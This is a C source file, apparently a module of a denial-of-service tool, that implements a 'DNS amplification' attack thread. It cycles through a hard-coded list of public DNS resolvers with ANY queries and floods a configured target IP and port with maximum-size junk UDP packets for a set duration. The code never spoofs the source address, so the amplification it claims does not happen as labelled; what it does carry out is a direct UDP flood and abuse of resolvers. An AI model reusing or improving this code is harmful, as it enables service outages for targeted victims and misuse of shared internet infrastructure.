#include "../../include/elcienco.h"
#include "../../include/protocols.h"

extern volatile int attack_running;

// List of open DNS resolvers for amplification
static const char *dns_resolvers[] = {
    "8.8.8.8",           // Google
    "8.8.4.4",           // Google
    "1.1.1.1",           // Cloudflare
    "1.0.0.1",           // Cloudflare
    "9.9.9.9",           // Quad9
    "208.67.222.222",    // OpenDNS
    "208.67.220.220",    // OpenDNS
    "64.6.64.6",         // Verisign
    "64.6.65.6",         // Verisign
    "84.200.69.80",      // DNS.WATCH
    "84.200.70.40",      // DNS.WATCH
    NULL
};

void build_dns_query(char *packet, size_t *packet_len, const char *query_domain) {
    struct dns_header *dns = (struct dns_header *)packet;
    
    dns->id = htons(rand() % 65535);
    dns->flags = htons(0x0100); // Standard query, recursion desired
    dns->qdcount = htons(1);    // One question
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;
    
    // Build question section
    char *qname = packet + sizeof(struct dns_header);
    const char *domain = query_domain;
    char *label_len = qname++;
    
    while (*domain) {
        if (*domain == '.') {
            *label_len = qname - label_len - 1;
            label_len = qname++;
            domain++;
        } else {
            *qname++ = *domain++;
        }
    }
    *label_len = qname - label_len - 1;
    *qname++ = 0;
    
    // Query type and class
    uint16_t *qtype = (uint16_t *)qname;
    *qtype++ = htons(DNS_ANY);
    uint16_t *qclass = qtype;
    *qclass = htons(1);
    
    *packet_len = (char *)qclass + sizeof(uint16_t) - packet;
}

void *dns_amplification(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    int sock = create_udp_socket();
    if (sock < 0) {
        free(data);
        return NULL;
    }
    
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in resolver_addr;
    resolver_addr.sin_family = AF_INET;
    resolver_addr.sin_port = htons(53);
    
    time_t start_time = time(NULL);
    unsigned long queries_sent = 0;
    int resolver_index = 0;
    
    printf("[DNS Amp Thread %d] Started against %s\n",
           data->thread_num, cfg.target);
    
    const char *amp_domains[] = {
        "isc.org", "ripe.net", "facebook.com", "google.com",
        "cloudflare.com", "amazon.com", NULL
    };
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        if (dns_resolvers[resolver_index] == NULL) {
            resolver_index = 0;
        }
        resolver_addr.sin_addr.s_addr = inet_addr(dns_resolvers[resolver_index]);
        resolver_index++;
        
        size_t query_len;
        build_dns_query(packet, &query_len, amp_domains[rand() % 6]);
        
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(cfg.port);
        target_addr.sin_addr.s_addr = inet_addr(cfg.target);
        
        sendto(sock, packet, query_len, 0,
               (struct sockaddr *)&resolver_addr, sizeof(resolver_addr));
        
        memset(packet, 0xFF, MAX_PACKET_SIZE);
        sendto(sock, packet, MAX_PACKET_SIZE, 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        queries_sent++;
        
        if (queries_sent % 10 == 0) {
            usleep(10000);
        }
    }
    
    printf("[DNS Amp Thread %d] Finished. Queries sent: %lu\n",
           data->thread_num, queries_sent);
    
    close(sock);
    free(data);
    return NULL;
}
